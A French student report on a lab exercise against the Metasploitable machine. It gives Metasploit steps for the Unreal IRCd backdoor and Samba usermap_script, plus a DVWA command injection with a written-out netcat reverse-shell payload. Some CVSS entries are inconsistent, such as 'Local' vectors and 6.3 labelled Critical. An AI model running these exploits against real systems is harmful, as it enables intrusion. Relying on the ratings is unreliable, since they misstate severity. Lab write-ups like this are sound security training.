# Rapport vulnérabilité Metasploitable

#### Grégoire JARRY - 3SI3

# RCE - Unreal IRC Daemon

Une backdoor étant resté secrète pendant plusieurs mois est présente dans cette version du client IRC Unreal. Cette backdoor est déclenché par l'envoi de la chaine "AB" suivi de n'importe quelle commande système. Il existe un module metasploit permettant d'exploiter cette vulnérabilité.

## Démarche de reproduction

- lancer msfconsole

- chercher le module correspondant a l'exploit avec la commande "search unreal irc"

- lancer le module "use exploit/unix/irc/unreal_ircd_3281_backdoor"

- set la variable RHOST sur l'ip de la metasploitable "set RHOST 192.168.247.129"

- entrer la commande "exploit"

- obtention d'un shell root


## score CVSS
| Nom | Niveau |
| --- | --- |
| Attack Vector       | Local  |
| Attack Complexity   | Low      |
| Privileges Required | None      |
| User Interaction    | None     |
| Scope               | Changed  |
| Confidentiality     | High     |
| Integrity           | High     |
| Availability        | High     |
|                    |          |
|**Score CVSS**      |**9.3 (Critical)**|


# RCE - Samba (usermap_script)


La fonctionnalité MS-RPC permet à un attaquant d'executer des commandes à travers des méta-caractères shell lorsqu'une option est activé dans le smb.conf (username map script), et permet un accès aux imprimantes et systèmes de partage de fichier. Il existe également un module metasploit permettant l'exploitation de cette vulnérabilité.

## Démarche de reproduction

- lancer msfconsole

- chercher le module correspondant a l'exploit avec la commande "search samba"

- lancer le module "use exploit exploit/multi/samba/usermap_script"

- set la variable RHOST sur l'ip de la machine metasploitable "set RHOST 192.168.247.129"

- entrer la commande "exploit"

- obtention d'un shell root


## score CVSS
| Nom | Niveau |
| --- | --- |
| Attack Vector       | Local  |
| Attack Complexity   | Low      |
| Privileges Required | None      |
| User Interaction    | None     |
| Scope               | Changed  |
| Confidentiality     | High     |
| Integrity           | High     |
| Availability        | High     |
|                    |          |
|**Score CVSS**      |**9.3 (Critical)**|


# RCE - DVWA command Injection

En exploitant la DVWA (Damn Vulnerale Web Application), il a été possible de créer un reverse shell et ainsi d'avoir un accès à la machine grâce au module d'Injection de Commande.



## Démarche de reproduction

- Se connecter à l'application web DVWA

- naviguer jusqu'à la page de Command Injection 

- fuzzing du champ "Ping", possibilité d'injection de commande shell (à l'aide de | ; &&)

- Création d'un listener en local "nc -l -p 1337"

- injection de la payload permettant la création du reverse shell "127.0.0.1 && nc @ip_attaquant 1337 -e /bin/sh"

- obtention d'un shell avec le user www-data


## score CVSS
| Nom | Niveau |
| --- | --- |
| Attack Vector       | Local  |
| Attack Complexity   | Low      |
| Privileges Required | Low      |
| User Interaction    | None     |
| Scope               | Changed  |
| Confidentiality     | Medium     |
| Integrity           | Medium     |
| Availability        | Medium     |
|                    |          |
|**Score CVSS**      |**6.3 (Critical)**|
